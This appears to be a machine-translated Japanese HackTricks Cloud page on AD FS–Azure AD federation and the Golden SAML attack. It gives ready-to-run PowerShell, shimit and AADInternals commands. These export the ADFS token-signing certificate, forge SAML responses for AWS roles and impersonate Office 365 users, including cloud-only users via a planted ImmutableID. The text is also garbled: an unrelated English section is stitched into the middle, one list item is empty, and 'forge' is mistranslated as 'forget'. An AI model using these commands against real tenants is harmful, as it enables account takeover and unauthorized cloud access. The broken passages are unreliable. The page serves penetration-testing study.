# フェデレーション

<details>

<summary><strong>ハックトリックをサポートして特典を得る！</strong></summary>

* **HackTricks** で **会社の広告を見たい**場合や、**PEASSの最新バージョンを入手したい**場合、または **HackTricksをPDFでダウンロード**したい場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) をチェックしてください！
* [**公式のPEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけて、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションを見つけましょう
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter**で **@carlospolopm** をフォローしましょう 🐦
* **ハッキングのトリックを共有するには、** [**HackTricks**](https://github.com/carlospolop/hacktricks) と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) の GitHub リポジトリに PR を提出してください。

</details>

## 基本情報

**フェデレーション**は、**信頼関係**を確立した**ドメイン**の集合です。信頼レベルは異なる場合がありますが、通常は**認証**を含み、ほぼ常に**認可**も含まれます。典型的なフェデレーションには、共有リソースへのアクセスのために**信頼**を確立した**複数の組織**が含まれる場合があります。

オンプレミス環境を**Azure AD**とフェデレーションし、このフェデレーションを認証および認可に使用することができます。このサインイン方法により、すべてのユーザーの**認証がオンプレミスで行われます**。この方法では、管理者はより厳格なアクセス制御レベルを実装することができます。**AD FS**およびPingFederateとのフェデレーションが利用可能です。

<figure><img src="../../../../.gitbook/assets/image (83) (1).png" alt=""><figcaption></figcaption></figure>

基本的に、フェデレーションでは、すべての**認証**が**オンプレミス**環境で行われ、ユーザーは信頼されたすべての環境でSSOを体験します。したがって、ユーザーは**オンプレミスの資格情報**を使用して**クラウド**アプリケーションにアクセスできます。

**セキュリティアサーションマークアップ言語（SAML）**は、プロバイダ間で認証および認可のすべての情報を**交換**するために使用されます。

フェデレーションのセットアップでは、次の3つのパーティが存在します。

* ユーザーまたはクライアント
* Identity Provider（IdP）
* Service Provider（SP）

<figure><img src="../../../../.gitbook/assets/image (1) (5).png" alt=""><figcaption></figcaption></figure>

1. 最初に、ユーザーはアプリケーション（Service Providerとも呼ばれる）にアクセスしようとします。これはAWSコンソール、vSphere Webクライアントなどです。実装によっては、クライアントは最初にIdPに直接アクセスし、この図の最初のステップをスキップする場合があります。
2. アプリケーションは、ユーザーを認証するためにIdP（Identity Provider、AD FS、Oktaなど）を検出し、SAML AuthnRequestを生成し、クライアントをIdPにリダイレクトします。
3. IdPはユーザーを認証し、SAMLResponseを生成し、ユーザーを介してSPに投稿します。
4. SPはSAMLResponseをチェックし、ユーザーをログインさせます。SPはIdPとの信頼関係を持っている必要があります。ユーザーはサービスを利用できるようになります。

**SAML認証と一般的な攻撃について詳しく学びたい場合は、次のリンクを参照してください:**

{% embed url="https://book.hacktricks.xyz/pentesting-web/saml-attacks" %}

## ピボット

* AD FSは、クレームベースのアイデンティティモデルです。
* "..クレームは、ユーザーに関して行われる主にクレームベースのアプリケーションへのアクセスの許可に使用される、ユーザーについての主張（たとえば、名前、アイデンティティ、グループ）です。"
* ユーザーのクレームはSAMLトークン内に書かれ、IdPによって機密性を提供するために署名されます。
* ユーザーはImmutableIDによって識別されます。これはグローバルに一意であり、Azure ADに格納されています。
* ImmutableIDは、ユーザーのためのAzure ADのConsistencyGuidとしてオンプレミスに格納され、またはユーザーのGUIDから派生することができます。
* 詳細は[https://learn.microsoft.com/en-us/windows-server/identity/ad-fs/technical-reference/the-role-of-claims](https://learn.microsoft.com/en-us/windows-server/identity/ad-fs/technical-reference/the-role-of-claims)を参照してください。

**Golden SAML攻撃:**

* ADFSでは、SAMLレスポンスはトークン署名証明書によって署名されます。
* 証明書が侵害された場合、Azure ADに同期された**任意のユーザーとして**Azure ADに認証することが可能です！
* PTAの悪用と同様に、ユーザーのパスワード変更やMFAは効果がありません。なぜなら、私たちは認証レスポンスを偽造しているからです。
* 証明書はDA権限を持つAD FSサーバーから抽出し、その後、インターネットに接続された任意のマシンから使用することができます。
* 詳細は[https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps](https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)を参照してください。

### Golden SAML

前のスキーマから最も興味深いのは、3番目の部分です。ここでは、**IdP**がユーザーのサインインを許可する**SAMLResponse**を生成します。特定のIdPの実装によっては、**レスポンス**はIdPの**秘密鍵**によって**署名**または**暗号化**される場合があります。これにより、**SPは**信頼できるIdPによってSAMLResponseが作成されたことを**検証**できます。

[ゴールデンチケット攻撃](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/golden-ticket)と同様に、ユーザーのアイデンティティと権限を保持するオブジェクトを**署名**する**キー**（ゴールデンチケットの場合は_KRBTGT_、ゴールデンSAMLの場合はトークン署名の秘密鍵）を使用して、**このような「認証オブジェクト」**（TGTまたはSAMLResponse）を**偽造**し、不正なアクセスを得るために任意のユーザーをなりすますことができます。

さらに、ゴールデンSAMLには以下の利点があります:

*
#### AWS + AD FS + Golden SAML = ♥（ケーススタディ）

[Active Directory Federation Services](https://docs.microsoft.com/en-us/previous-versions/windows/server-2008/bb897402\(v=msdn.10\))（**AD FS**）は、信頼できるビジネスパートナー間での**アイデンティティ情報の安全な共有**を可能にする、Microsoftの標準ベースのドメインサービスです（**フェデレーション**）。これは、フェデレーション内の他のサービスプロバイダーにドメインユーザーのアイデンティティを提供するドメイン内のサービスです。

AWSが（フェデレーション内の）侵害したドメインを**信頼している**と仮定すると、この攻撃を利用して、実質的に**クラウド環境で任意の権限を取得**することができます。この攻撃を実行するためには、SAMLオブジェクトに署名する**プライベートキー**が必要です（ゴールデンチケットの場合と同様に、KRBTGTが必要です）。このプライベートキーには、ドメイン管理者のアクセスは必要ありません。AD FSユーザーアカウントのみが必要です。

以下は、ゴールデンSAML攻撃を実行するための要件のリストです：

* **トークン署名のプライベートキー**
* **IdPの公開証明書**
* **IdPの名前**
* **アサムするロールの名前**
* ドメイン\ユーザー名
* AWSでのロールセッション名
* AmazonアカウントID

_必須の要件は強調表示されています。その他の必須でないフィールドについては、好きな値を入力できます。_

**プライベートキー**にアクセスするためには、**AD FSアカウント**へのアクセスが必要であり、その**パーソナルストア**から**プライベートキーをエクスポート**する必要があります（[mimikatz](https://github.com/gentilkiwi/mimikatz)などのツールを使用してエクスポートできます）。その他の要件については、PowerShellスナップインMicrosoft.Adfs.Powershellをインポートし、次のように使用します（ADFSユーザーとして実行する必要があります）：
```powershell
# From an "AD FS" session
# After having exported the key with mimikatz

# ADFS Public Certificate
[System.Convert]::ToBase64String($cer.rawdata)

# IdP Name
(Get-ADFSProperties).Identifier.AbsoluteUri

# Role Name
(Get-ADFSRelyingPartyTrust).IssuanceTransformRule
```
すべての情報を持っていると、[**shimit**](https://github.com/cyberark/shimit)を使用してなりすましをしたいユーザーとして有効なSAMLResponseを忘れることがあります。

{% code overflow="wrap" %}
```bash
# Apply session for AWS cli
python .\shimit.py -idp http://adfs.lab.local/adfs/services/trust -pk key_file -c cert_file -u domain\admin -n admin@domain.com -r ADFS-admin -r ADFS-monitor -id 123456789012
# idp - Identity Provider URL e.g. http://server.domain.com/adfs/services/trust
# pk - Private key file full path (pem format)
# c - Certificate file full path (pem format)
# u - User and domain name e.g. domain\username (use \ or quotes in *nix)
# n - Session name in AWS
# r - Desired roles in AWS. Supports Multiple roles, the first one specified will be assumed.
# id - AWS account id e.g. 123456789012

# Save SAMLResponse to file
python .\shimit.py -idp http://adfs.lab.local/adfs/services/trust -pk key_file -c cert_file -u domain\admin -n admin@domain.com -r ADFS-admin -r ADFS-monitor -id 123456789012 -o saml_response.xml
```
{% endcode %}

<figure><img src="../../../../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

### オンプレミス -> クラウド
```powershell
# With a domain user you can get the ImmutableID of the target user
[System.Convert]::ToBase64String((Get-ADUser -Identity <username> | select -ExpandProperty ObjectGUID).tobytearray())

# On AD FS server execute as administrator
Get-AdfsProperties | select identifier

# When setting up the AD FS using Azure AD Connect, there is a difference between IssueURI on ADFS server and Azure AD.
# You need to use the one from AzureAD.
# Therefore, check the IssuerURI from Azure AD too (Use MSOL module and need GA privs)
Get-MsolDomainFederationSettings -DomainName deffin.com | select IssuerUri

# Extract the ADFS token signing certificate from the ADFS server using AADInternals
Export-AADIntADFSSigningCertificate

# Impersonate a user to to access cloud apps
Open-AADIntOffice365Portal -ImmutableID v1pOC7Pz8kaT6JWtThJKRQ== -Issuer http://deffin.com/adfs/services/trust -PfxFileName C:\users\adfsadmin\Documents\ADFSSigningCertificate.pfx -Verbose
```
# Federation

## Introduction

In Azure AD Connect, the ImmutableID attribute is used to link on-premises users with their corresponding cloud-only users. This attribute is essential for the synchronization process and ensures that the correct user accounts are connected.

## Impersonating Cloud-Only Users

By manipulating the ImmutableID attribute, it is possible to create an ImmutableID for cloud-only users and impersonate them. This can be done by generating a valid ImmutableID value and assigning it to a cloud-only user account.

## Steps to Impersonate Cloud-Only Users

To impersonate a cloud-only user, follow these steps:

1. Generate a valid ImmutableID value.
2. Assign the generated ImmutableID value to the cloud-only user account.
3. Use the impersonated user account to gain unauthorized access or perform malicious activities.

## Mitigation

To mitigate the risk of impersonation, it is important to implement proper security measures. This includes:

- Regularly monitoring and auditing user accounts for any suspicious activity.
- Enforcing strong password policies and multi-factor authentication.
- Limiting user privileges and access rights.
- Keeping the Azure AD Connect server up to date with the latest security patches.

By following these best practices, you can reduce the likelihood of unauthorized access and protect your organization's data.
```powershell
# Create a realistic ImmutableID and set it for a cloud only user
[System.Convert]::ToBase64String((New-Guid).tobytearray())
Set-AADIntAzureADObject -CloudAnchor "User_19e466c5-d938-1293-5967-c39488bca87e" -SourceAnchor "aodilmsic30fugCUgHxsnK=="

# Extract the ADFS token signing certificate from the ADFS server using AADInternals
Export-AADIntADFSSigningCertificate

# Impersonate the user
Open-AADIntOffice365Portal -ImmutableID "aodilmsic30fugCUgHxsnK==" -Issuer http://deffin.com/adfs/services/trust -PfxFileName C:\users\adfsadmin\Desktop\ADFSSigningCertificate.pfx -Verbose
```
## 参考文献

* [https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-fed](https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-fed)
* [https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps](https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)

<details>

<summary><strong>ハックトリックをサポートして特典を得る！</strong></summary>

* **HackTricks**で**会社の広告を見たい**場合や、**最新バージョンのPEASSをダウンロード**したい場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れる
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけて、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションを発見する
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で私をフォローする🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)
* **ハッキングのトリックを共有するには、**[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。

</details>
